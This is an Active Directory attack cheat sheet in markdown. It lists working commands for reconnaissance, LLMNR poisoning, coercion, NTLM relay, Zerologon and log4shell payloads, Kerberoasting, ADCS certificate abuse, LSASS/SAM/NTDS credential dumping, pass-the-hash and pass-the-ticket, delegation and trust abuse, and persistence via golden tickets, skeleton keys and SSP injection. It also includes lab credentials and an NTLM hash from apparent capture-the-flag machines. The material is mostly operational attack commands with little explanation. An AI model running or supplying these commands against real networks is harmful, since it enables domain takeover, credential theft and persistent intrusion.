
## Scanning
```bash
cme smb <ip_range>
nmap -PN -sV --top-ports 50
```
## Find DC IP
```bash
nmcli dev show eth0 # show domain name & dns
nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>
nslookup -type=srv _kerberos._tcp.<domain>
```
## Shares
```bash
cme smb <ip> -u '' -p '' # enumerate null session
cme smb <ip> -u 'a' -p '' # enumerate anonymous access
cme smb 192.168.1.0/24 --gen-relay-list relaylistOutputFilename.txt # scan for SMB signing not required
```
## Ldap
```bash
nmap -n -sV --script "ldap* and not brute" -p 389 <dc-ip>
ldapsearch -x -h <ip> -s base  
crackmapexec ldap 10.10.11.181 -u d.klay -p 'Darkmoonsky248girl' -k --users
```
## Poisoning
```bash
# LLMNR
responder -I eth0 (use --lm to force lm downgrade) # disable smb & http if relay 
```
## Coerce
```bash
PetitPotam.py  -d <domain> <listener_ip> <target_ip>
```
# Low Hanging Fruits
## Zerologon
```bash
zerologon-scan '<dc_netbios_name>' '<ip>'
python3 cve-2020-1472-exploit.py <MACHINE_BIOS_NAME> <ip>
secretsdump.py <DOMAIN>/<MACHINE_BIOS_NAME>\$@<IP> -no-pass -just-dc-user "Administrator" 
secretsdump.py -hashes :<HASH_admin> <DOMAIN>/Administrator@<IP>
```
## log4shell
```bash
${jndi:ldap://<ip>:<port>/o=reference}
```
## mssql credentials
```bash
use admin/mssql/mssql_enum_sql_logins
```
# Valid Username
## Password Spray
*Check password policy before you do any spraying!!*
```bash
cme <IP> -u 'user' -p 'password' --pass-pol
enum4linx -u 'username' -p 'password' -P <IP>
Get-ADDefaultDomainPasswordPolicy
Get-ADFineGrainedPasswordPolicy -filter *
Get-ADUserResultantPasswordPolicy -Identity <user>
ldapsearch-ad.py --server '<dc>' -d <domain> -u <user> -p <pass> --type pass-pols
```
```bash
cme smb <dc-ip> -u user.txt -p password.txt --no-bruteforce # test user=password
cme smb <dc-ip> -u user.txt -p password.txt # multiple test (careful of lock policy)
sprayhound -U <users.txt> -d <domain> -dc <dcip>
```

## ASREPRoast
Needs creds:
```powershell
Get-DomainUser -PreauthNotRequired -Properties SamAccountName
MATCH (u:User {dontreqpreauth:true}), (c:Computer), p=shortestPath((u)-[*1..]->(c)) RETURN p
Rubeus.exe asreproast /format:hashcat
```
```bash
python GetNPUsers.py <domain>/ -usersfile <usernames.txt> -format hashcat -outputfile <hashes.domain.txt>
```
```bash
impacket-GetNPUsers -dc-ip dc.absolute.htb -usersfile valid_users absolute.htb/
```
## Kerberoasting
```bash
Rubeus.exe keberoast /domain:<domain> /dc:<dcip> /nopreauth: <asrep_user> /spns:<users.txt>
GetUserSPNs.py -no-preauth "<asrep_user>" -usersfile "<user_list.txt>" -dc-host "<dc_ip>" "<domain>"/"user"
GetUserSPNs.py -request -dc-ip "<dc_ip>" "<domain>"/"<user>" -outputfile "kerberoasted"
```
# MITM
## Responder
```bash
responder -I eth0 (use --lm to force lm downgrade)
smbclient.py
```
## NTLM Relay
```bash
relay on self:
use exploit/windows/smb/smb_relay #windows200 / windows server2008

smb -> LDAP
ntlmrelayx.py --remove-mic --escalate-user <user> -t ldap://<dc_fqdn> -smb2support   #DcSync
ntlmrelayx.py -t ldaps://<dc> --remove-mic --add-computer <computer_name> <computer_password> --delegate-access -smb2support   #RBCD
ntlmrelayx -t ldap://<dc> --shadow-credentials --shadow-target '<dc>'  #Shadow Credentials https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/shadow-credentials
ntlmrelayx.py  -wh <attacker_ip> -t ldap://<target> -l /tmp -6 -debug   #Users
```
## SMB unsigned
```bash
Find it:
nmap -Pn -sS -T4 --open --script smb-security-mode -p445 ADDRESS/MASK
use exploit/windows/smb/smb_relay
cme smb $hosts --gen-relay-list relay.txt
```
```bash
Relay it:
ntlmrelayx.py  -tf targets.txt  -smb2support (-6) --enum-domain
ntlmrelayx.py  -tf targets.txt  -smb2support -socks (-6)  #lateral move
```
SMB can be used to relay ESC8 attacks
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#esc8---ad-cs-relay-attack
```bash
PetitPotam.py -u <user> -p <pass> -d <domain> <relay ip> <target ip> 
ntlmrelayx.py -t <CA hostname>/cersrv/certfnsh.asp --no-wcf-server -smb2support --adcs --template DomainController --no-http-server

Then on a domain joined window host:
.\Rubeus.exe asktgt /user:<dc hostname>$ /domain:<domain> /dc:<dc hostname> /certificate:<extracted cert from relay>
```
```bash
Relay to MSSQL:
ntlmrelayx.py -t mssql://<ip> -smb2support –socks
```
```bash
Zerologon:
ntlmrelayx.py -t dcsync://<dc_02_ip> -smb2support -auth-smb <user>:<password>
```

# Valid Credentials
## Bloodhound
```
sharphound.exe -c all -d <domain>
import-module sharphound.ps1;invoke-bloodhound -collectionmethod all -domain <domain>
./rusthound -d <domain_to_enum> -u '<user>@<domain>' -p '<password>' -o <outfile> -z
bloodhound-python -d <domain> -u <user> -p <password> -gc <dc> -c all
```
## SMB enumeration
```bash
cme smb <ip> -u <user> -p <password> --shares
```
## Retrieve users
```bash
GetADUsers.py -all -dc-ip <dc_ip> <domain>/<username>
cme smb <ip> -u <user> -p '<password>' --users 
```
## Enumerate ADCS
```bash
certipy find -u <user>@<domain> -p <password> -dc-ip <domaincontroller>
```
## Coercion
```bash
rpcdump.py <domain>/<user>:<password>@<domain_server> | grep MS-RPRN
+ 
printerbug.py '<domain>/<username>:<password>'@<Printer IP> <listener_ip>

PetitPotam.py  -d <domain> -u <user>-p <password> <listener_ip> <target_ip>
coercer.py -u <user> -d <domain> -p <password> -t <target> -l <attacker_ip>
```

# User level host access
## Applocker info
```powershell
Get-ChildItem -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe (dll/msi/...)
```
## Applocker bypasses
```
use C:\Windows\Tasks
installutil.exe /logfile= /LogToConsole=false /U C:\runme.exe
mshta.exe my.hta
MSBuild
```
## AMSI Bypass
```
https://amsi.fail/
Use reflection from meterpreter
patch amsi.dll
```
## Find passwords
```
findstr /si 'password' *.txt *.xml *.docx
```
## UAC Bypass
```
FodHelper
WSReset
MSDT
https://github.com/hfiref0x/UACME
```
## Common Exploits
```
CVE-2021-36934 (HiveNightmare/SeriousSAM)

service account (IIS/Mssql) (got SEImpersonate)
RoguePotato
Juicy Potato / Lovely Potato
PrintSpoofer
CertPotato
```
## Other exploits:
```bash
privexchange
python privexchange.py -ah <attacker_host_or_ip> <exchange_host> -u <user> -d <domain> -p <password>

Sam AccountName:
.\noPac.exe -domain  <domain> -user <user> -pass <pass> /dc <dc_fqdn> /mAccount <machine_account> /mPassword  <machine_pass> /service cifs /ptt
with impacket :  addcomputer.py / addspn.py / renameMachine.py / getTGT.py / renameMachine.py / getST.py

PrintNightmare
CVE-2021-1675.py <domain>/<user>:<password>@<target> '\\<smb_server_ip>\<share>\inject.dll'

Certifried:
certipy account create -u <user>@<domain> -p '<password>' -user 'certifriedpc' -pass 'certifriedpass' -dns '<fqdn_dc>'
```


# Admin access
## Extract credentials from LSASS
```powershell
PPLdump64.exe <lsass.exe|lsass_pid> lsass.dmp
mimikatz "!+" "!processprotect /process:lsass.exe /remove" "privilege::debug" "token::elevate"  "sekurlsa::logonpasswords" "!processprotect  /process:lsass.exe" "!-" #with mimidriver.sys 
procdump.exe -accepteula -ma lsass.exe lsass.dmp
mimikatz "privilege::debug" "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords" "exit"
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords"  "exit"
load kiwi -> creds_all
cme smb <ip_range> -u <user> -p <password> -M lsassy
lsassy -d <domain> -u <user> -p <password> <ip>

```
## Extract Credentials from SAM
```bash
cme smb <ip_range> -u <user> -p '<password>' --sam 
reg save HKLM\SAM <file>;  reg save HKLM\SECURITY <file>; reg save HKLM\SYSTEM <file> + secretsdump.py  -system SYSTEM -sam SAM LOCAL
diskshadow list shadows all + mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
mimikatz "privilege::debug" "lsadump::sam" "exit"
secretsdump.py <domain>/<user>:<password>@<ip>
```
## Extract credentials from LSA
```bash
cme smb <ip_range> -u <user> -p '<password>' --lsa
secretsdump.py <domain>/<user>:<password>@<ip>
reg.py <domain>/<user>:<password>@<ip> backup -o '\\<smb_ip>\share'
secretsdump.py -security <security_file> -system <system_file> LOCAL
```
## Retrieve stored passwords
```powershell
findstr /si 'password' *.txt *.xml *.docx
lazagne.exe all
%appdata%\Local\Google\Chrome\User Data\Default + SharpChromium.exe

```
## Data protection API (dpapi)
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords
```bash
DonPAPI.py <domain>/<user>:<password>@<target>
mimikatz.exe "sekurlsa::dpapi"
secretsdump.py <domain>/<user>:<passwor>@<ip>
```
## Token manipulation
```powershell
.\incognito.exe list_tokens -u + .\incognito.exe execute -c "<domain>\<user>" powershell.exe
impersonate_token <domain>\\<user>

cme smb <ip> -u <user> -p <password> -M impersonate 
```
## ACLs and ACEs permissions
aclpwn.py - https://github.com/fox-it/aclpwn.py

## DCsync (Domain Admins, Enterprise admins and DC hosts)
```
mimikatz lsadump::dcsync /domain:<target_domain> /user:<target_domain>\administrator
secretsdump '<domain>'/'<user>':'<password>'@'<domain_controller>'
```
## ShadowCredentials with ADCS
```
certipy shadow auto '-u <user>@<domain>' -p <password> -account '<target_account>'
pywhisker.py -d "FQDN_DOMAIN" -u "user1" -p "CERTIFICATE_PASSWORD" --target "TARGET_SAMNAME" --action "list"
```
## Groups 
```
membership, GenerigAll/WriteProperty or WriteProperty on group -> you can add a group member:
net group "<group>" <myuser> /add /domain
ldeep ldap -u <user> -p <pwd> -d <domain> -s ldap://<dc> add_to_group "CN=<user>,DC=<domain>" "CN=<group>,DC=<domain>"

WriteOwner on Group -> WriteDACL + WriteOwner, Give yourself Generic all -> owneredit.py -> dacledit.py
```
## Computers
```
GenericAll / GenericWrite
-> msDs-AllowedToActOnBehalf > RBCD
-> add Key Credentials > Shadow Credentials
```
## User
```
GenericAll / GenericWrite
-> change password - net user <user> <password> /domain
-> add SPN (target Kerberoasting) - targetedKerberoast.py -d <domain> -u <user> -p <pass>
-> add Key Credentials -> Shadow Credentials

ForceChangePassword
net user <user> <password> /domain
net rpc password <user> <password> -S <dc_fqdn>
```
## LAPS
```
Check in bloodhound who can read LAPS: MATCH p=(g:Group)-[:ReadLAPSPassword]->(c:Computer) RETURN p
Get-LAPSPasswords -DomainController <ip_dc> -Credential <domain>\<login> | Format-Table -AutoSize
foreach ($objResult in $colResults){$objComputer = $objResult.Properties; $objComputer.name|where {$objcomputer.name -ne $env:computername}|%{foreach-object {Get-AdmPwdPassword -ComputerName $_}}}
cme ldap <dc_ip> -d <domain> -u <user> -p <password> --module laps
use post/windows/gather/credentials/enum_laps
```
## GPO
```
Bloodhound: MATCH (gr:Group), (gp:GPO), p=((gr)-[:GenericWrite]->(gp)) RETURN p
Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=blah,DC=com" -ResolveGUIDs | ? {​​​​​​​ $_.ObjectAceType -eq "Group-Policy-Container" }​​​​​​​ | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? {​​​​​​​​​​​​​ $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" }​​​​​​​​​​​​​ | select ObjectDN, SecurityIdentifier | fl

```
# ADCS
Web enrollment is up - ESC8 - can be easy domain admin

You can also check if web enrollment is up via crackmapexec
```bash
crackmapexec ldap 10.10.11.202 -u ryan.cooper -p NuclearMosquito3 -M adcs
```
You can upload cerify.exe and check for vulnerabilities too:
```powershell
.\Certify.exe find /vulnerable /currentuser
```
Look for Domain Users in enrollment rights:
```text
 Enrollment Rights           : sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Domain Users           S-1-5-21-4078382237-1492182817-2568127209-513
```
## Certify
Exploit with:
```powershell
.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator
```
You will get a result back that starts with -----BEGIN RSA PRIVATE KEY----- and ends with -----END CERTIFICATE-----
Copy all of it to a file `cert.pem`
Generate cert with:
```bash
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```
Upload Rubeus and the new cert to the box:
```powershell
C:\programdata> .\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\cert.pfx /getcredentials /show /nowrap
```
If it worked, the result will have this:
```text
[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : A52F78E4C751E5F5E17E1E9F3E58F4EE

```
That is the admin hash.


## Certipy

```bash
/home/kali/.local/bin/certipy
/home/kali/.local/bin/certipy  find -u ryan.cooper -p NuclearMosquito3 -target sequel.htb -text -stdout -vulnerable
```
Look for `'SEQUEL.HTB\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication` and then
```bash
/home/kali/.local/bin/certipy  req -u ryan.cooper -p NuclearMosquito3 -target sequel.htb -upn administrator@sequel.htb -ca sequel-dc-ca -template UserAuthentication
sudo ntpdate -u sequel.htb
/home/kali/.local/bin/certipy  auth -pfx administrator.pfx
```


Older stuff:
```bash
ntlmrelayx.py -t http://<dc_ip>/certsrv/certfnsh.asp -debug -smb2support --adcs --template DomainController
-> Rubeus.exe asktgt /user:<user> /certificate:<base64-certificate> /ptt
-> gettgtpkinit.py -pfx-base64 $(cat cert.b64) <domain>/<dc_name>$ <ccache_file>

certipy relay -ca <ca_ip> -template DomainController -> certipy auth -pfx <certificate> -dc-ip <dc_ip>
```
## Get templates information 
```
certutil -v -dsTemplate
certify.exe find [ /vulnerable]
certipy find -u <user>@<domain> -p <password> -dc-ip <domaincontroller>
```
## Display CA information
```
certutil -TCAInfo
certify.exe cas
```
## Get CA flags (if remote registry is enabled)
```
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
certipy / certify.exe (only the flag ATTRIBUTESUBJECTALTNAME2)
```

# Lateral Movement

## MSSQL
```
Bloodhound: MATCH p=(u:User)-[:SQLAdmin]->(c:Computer) RETURN p
cme mssql <ip> -u <user> -p <password> -d <domain>

Shell:
EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;  RECONFIGURE;
EXEC xp_cmdshell '<cmd>'
```
Trust links:
```
Get-SQLServerLinkCrawl -username <user> -password <pass> -Verbose -Instance <sql_instance> -Query "<query>"
use exploit/windows/mssql/mssql_linkcrawler
```
impacket:
```
mssqlclient.py -windows-auth <domain>/<user>:<password>@<ip> (pr #1397)

```

## Local User
Shell:
```
cme smb -u <user> -p <pass>' <ip> --local-auth
psexec.py <domain>/<user>:<password>@<ip>
psexec.exe -AcceptEULA \\<ip>
mimikatz "privilege::debug sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash>"
evil-winrm -i <ip> -u <user> -p <password>  - my favourite
xfreerdp /u:<user> /d:<domain> /p:<password> /v:<ip>
smbclient.py <domain>/<user>:<password>@<ip>
crackmapexec mssql <ip_range> -u <user> -p <password>
mssqlclient.py -windows-auth <domain>/<user>:<password>@<ip>
```
Pseudo-shell - Fire write and read
```bash
atexec.py  <domain>/<user>:<password>@<ip> "command"
smbexec.py  <domain>/<user>:<password>@<ip>
wmiexec.py  <domain>/<user>:<password>@<ip>
dcomexec.py  <domain>/<user>:<password>@<ip>
cme smb <ip_range> -u <user> -p <password> -d <domain>
cme smb <ip_range> -u <user> -p <password> -local-auth

```
## NTLM hash
## Pass the hash (PTH)
full shell:
```bash
psexec.py -hashes "hash" user@ip
psexec.exe -AcceptEULA \\<ip>
mimikatz "privilege::debug sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash>"
```
pseudo-shell
```bash
atexec.py -hashes ":<hash>" <user>@<ip> "command"
smbexec.py -hashes ":<hash>" <user>@<ip>
wmiexec.py -hashes ":<hash>" <user>@<ip>
dcomexec.py -hashes ":<hash>" <user>@<ip>
crackmapexec smb <ip_range> -u <user> -d <domain> -H ':<hash>'
crackmapexec smb <ip_range>  -u <user> -H ':<hash>' --local-auth
```
winrm
```bash
evil-winrm -i <ip> -u <user> -H <hash>
reg.py <domain>/<user>@<ip> -hashes ':<hash>' add -keyName 'HKLM\System\CurrentControlSet\Control\Lsa' -v 'DisableRestrictedAdmin' -vt 'REG_DWORD' -vd '0'
```
smb
```bash
smbclient.py  -hashes ":<hash>" <user>@<ip>
```
mssql
```bash
crackmapexec mssql <ip_range> -H ':<hash>'
mssqlclient.py -windows-auth -hashes ":<hash>" <domain>/<user>@<ip> 
```
Pass The Key
```bash
Rubeus asktgt /user:victim /rc4:<rc4value>
getTGT.py <domain>/<user> -hashes :<hashes>
getTGT.py -aesKey '<key>' <domain>/<user>@<ip>
```
## Kerberos
pass the ticket
```bash
export KRB5CCNAME=/root/impacket-examples/domain_ticket.ccache > impacket tools: Same as Pass the hash but use : -k and -no-pass for impacket
mimikatz kerberos::ptc "<ticket>"
Rubeus.exe ptt /ticket:<ticket>
proxychains secretsdump -k'<domain>'/'<user>'@'<ip>'
```
aesKey
```bash
impacket tools: Same as Pass the hash but use : -aesKey for impacket (and use FQDN)
proxychains secretsdump -aesKey <key> '<domain>'/'<user>'@'<ip>'
```
SOCK pivoting with relay
```bash
proxychains lookupsid.py <domain>/<user>@<ip> -no-pass -domain-sids
proxychains mssqlclient.py -windows-auth <domain>/<user>@<ip> -no-pass
proxychains secretsdump -no-pass '<domain>'/'<user>'@'<ip>'
proxychains atexec.py  -no-pass  <domain>/<user>@<ip> "command"
proxychains smbexec.py  -no-pass  <domain>/<user>@<ip>
proxychains smbclient.py -no-pass <user>@<ip>
```
certificate
```bash
get certificate:
certipy auth -pfx <crt_file> -dc-ip <dc_ip>

pass the cert:
pkinit:
 gettgtpkinit.py -cert-pfx "<pfx_file>" ^[-pfx-pass  "<cert-password>"] "<fqdn_domain>/<user>" "<tgt_ccache_file>"
 Rubeus.exe asktgt /user:"<username>" /certificate:"<pfx_file>" [/password:"<certificate_password>"] /domain:"<fqdn-domain>" /dc:"<dc>" /show
 certipy auth -pfx <crt_file> -dc-ip <dc_ip>

Schannel:
certipy auth -pfx <crt_file> -ldap-shell
add_computer
set_rbcd
RBCD
```

Domain admin
dump ntds.dit
```bash
cme smb <dcip> -u <user> -p <password> -d <domain> --ntds
secretsdump.py '<domain>/<user>:<pass>'@<ip>
ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q
windows/gather/credentials/domain_hashdump
certsync -u <user> -p <password> -d <domain> -dc-ip <dcip> -ns <nsip>
```
dpapi
``` bash
dpapi.py backupkeys -hashes ':<hash>' -t Administrator@<dc_ip> --export  
# note : dpapi.py != DonPAPI

DonPAPI -pvk <domain_backupkey.pvk> - H ':<hash>' <domain>/<user>@<ip_range>
```

# Kerberos Delegation
List delegations:
```bash
ldeep ldap -u <user> -p '<password>' -d <domain> -s ldap://<dc_ip> delegations
findDelegation.py  <domain>/<user>:<password>@<ip>
```
## Unconstrained delegation

```bash
Get unconstrained delegation machines:
Get-NetComputer -Unconstrained
Get-DomainComputer -Unconstrained -Properties DnsHostName
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c
MATCH (u:User {owned:true}), (c:Computer {unconstraineddelegation:true}), p=shortestPath((u)-[*1..]->(c)) RETURN p

Get tickets:
privilege::debug sekurlsa::tickets /export sekurlsa::tickets /export
Rubeus dump /service:krbtgt /nowrap
Rubeus dump /luid:0xdeadbeef /nowrap
```
# Constrained delegation
```bash
Get constrained delegation:
Get-DomainComputer -TrustedToAuth -Properties DnsHostName, MSDS-AllowedToDelegateTo
Get-DomainUser -TrustedToAuth
MATCH (c:Computer), (t:Computer), p=((c)-[:AllowedToDelegate]->(t)) RETURN p
MATCH (u:User {owned:true}), (c:Computer {name: "<MYTARGET.FQDN>"}), p=shortestPath((u)-[*1..]->(c)) RETURN p
```
```bash
With protocol transition:
Object: msDS-AllowedToDelegateTo
UAC: TRUST_TO_AUTH_FOR_DELEGATION
Rubeus hash /password:<password>

Rubeus asktgt /user:<user> /domain:<domain> /aes256:<AES 256 hash> -> Rubeus s4u /ticket:<ticket> /impersonateuser:<admin_user> /msdsspn:<spn_constrained> /altservice:CIFS /ptt

Without protocol transition:
Object: msDS-AllowedToDelegateTo
UAC: TRUSTED_FOR_DELEGATION

RBCD: 
addcomputer.py -computer-name '<rbcd_com>$' -computer-pass '<rbcd_compass>' -dc-ip <dc> '<domain>/<user>:<password>'
rbcd.py -delegate-from '<rbcd_com>$' -delegate-to '<constrained>$' -dc-ip '<dc>' -action 'write' -hashes '<hash>' <domain>/<constrained>$
getST.py -self -impersonate "administrator" -dc-ip <ip> <domain>/<rbcd_com>$':'<rbcd_compass>
getST.py -spn host/<constrained> -hashes '' '<domain>/<computer_account>' -impersonate Administrator --dc-ip <dc_ip> -additional-ticket <previous_ticket>
getST.py -spn <constrained_spn>/<target> -hashes '<hash>' '<domain>/<constrained>$' -impersonate Administrator --dc-ip <dc_ip> -additional-ticket <previous_ticket>

```
## RBCD
```bash
rubeus.exe hash /password:<computer_pass> /user:<computer> /domain:<domain> -> rubeus.exe s4u /user:<fake_computer$> /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/<victim.domain.local> /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt

rbcd.py -delegate-from '<computer>$' -delegate-to '<target>$' -dc-ip '<dc>' -action 'write' <domain>/<user>:<password> -> getST.py -spn host/<dc_fqdn> '<domain>/<computer_account>:<computer_pass>' -impersonate Administrator --dc-ip <dc_ip>

add computer account:
addcomputer.py -computer-name '<computer_name>' -computer-pass '<ComputerPassword>' -dc-host <dc> -domain-netbios <domain_netbios> '<domain>/<user>:<password>'
```

# Trust relationships

## Enumeration
```powershell
nltest.exe /trusted_domains
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
Get-DomainTrust -Domain <domain>
Get-DomainTrustMapping
ldeep ldap -u <user> -p '<password>' -d <domain> -s ldap://<dc_ip>  trusts
```
## Child Domain to Forest Compromise - extra SIDs (parent/child) (child/parent)
Golden ticket
```powershell
Get-DomainSID -Domain <domain>
Get-DomainSID -Domain <target_domain>
-> mimikatz lsadump::dcsync /domain:<domain> /user:<domain>\krbtgt
  -> mimikatz kerberos::golden /user:Administrator /krbtgt:<HASH_KRBTGT> /domain:<domain> /sid:<user_sid> /sids:<RootDomainSID-519> /ptt

lookupsid.py  -domain-sids <domain>/<user>:'<password>'@<dc_ip> 0
-> ticketer.py -nthash <child_krbtgt_hash> -domain-sid <child_sid> -domain <child_domain> -extra-sid <parent_domain_sid>-519 goldenuser

raiseChild.py <domain>/<user>:'<password>' 
```
inter_realm_ticket TRUST (parent/child) (child/parent)
```cmd
mimikatz lsadump::trust /patch -> mimikatz kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /aes256:<trust_key_aes256> /sids:<target_domain_sid>-519 /service:krbtgt /target:<target_domain> /ptt
ticketer.py -nthash <trust_key> -domain-sid <child_sid> -domain <child_domain> -extra-sid <parent_domain_sid>-519 -spn krbtgt/<parent_domain> goldenuser
 -> getST.py -k -no-pass -spn cifs/<dc_fqdn> <parent_domain>/trustfakeuser@<parent_domain> -debug
```
ForeignGroupMember
```
Users with foreign Domain Group Membership:
MATCH p=(n:User)-[:MemberOf]->(m:Group) WHERE n.domain="<domain>" AND m.domain<>n.domain RETURN p

Groups with Foreign Domain Group Membership
MATCH p=(n:Group {domain:"<domain>"})-[:MemberOf]->(m:Group) WHERE m.domain<>n.domain AND n.name<>m.name RETURN p

Get-DomainForeignGroupMember -Domain <target>
convertfrom-sid <sid>
```
Forest  To Forest - extra SID (SID History / TREAT_AS_EXTERNAL)
```
golden ticket:
Get-DomainSID -Domain <domain>
Get-DomainSID -Domain <target_domain>
->  (SID filtering, Find group with SID > 1000)
	Get-DomainGroupMember -Identity "<group>" -Domain <target_domain>
		mimikatz lsadump::dcsync /domain:<domain> /user:<domain>\krbtgt
		ticketer.py -nthash <krbtgt_hash> -domain-sid <from_sid> -domain <from_domain> -extra-sid <to_domain>-<group_id>  goldenuser //(group id must be > 1000)

Trust ticket:
Get the trust ticket in the ntds (TARGET_DOMAIN$)
ticketer.py -nthash <trust_key> -domain-sid <from_domain_sid> -domain <from_domain> -extra-sid <to_domain>-<group_id> -spn krbtgt/<to_domain> trustuser  //(group id must be > 1000)
	-> getST.py -k -no-pass -spn cifs/<dc_fqdn> <parent_domain>/trustfakeuser@<parent_domain> -debug
```

Forest to Forest Compromise - MSSQL trusted links
```
Get-SQLServerLinkCrawl -username <user> -password <pass> -Verbose -Instance <sql_instance>
mssqlclient.py -windows-auth <domain>/<user>:<password>@<ip> 
```

# Persistence
```
net group "domain admins" myuser /add /domain
```
Golden ticket
```
ticketer.py -aesKey <aeskey> -domain-sid <domain_sid> -domain <domain> <anyuser> 
mimikatz "kerberos::golden /user:<admin_user> /domain:<domain> /sid:<domain-sid>/aes256:<krbtgt_aes256> /ptt"
```
Silver Ticket
```
mimikatz "kerberos::golden /sid:<current_user_sid> /domain:<domain-sid> /target:<target_server> /service:<target_service> /aes256:<computer_aes256_key> /user:<any_user> /ptt"
ticketer.py -nthash <machine_nt_hash> -domain-sid <domain_sid> -domain <domain> <anyuser>
```
Skeleton Key
```
mimikatz "privilege::debug" "misc::skeleton" "exit"
```
Custom SSP
```
mimikatz "privilege::debug" "misc::memssp" "exit"
C:\Windows\System32\kiwissp.log
```
Golden certificate
```
certipy ca -backup -ca '<ca_name>' -username <user>@<domain> -hashes <hash>
certipy forge -ca-pfx <ca_private_key> -upn <user>@<domain> -subject 'CN=<user>,CN=Users,DC=<CORP>,DC=<LOCAL>
```
DC Shadow
https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcshadow

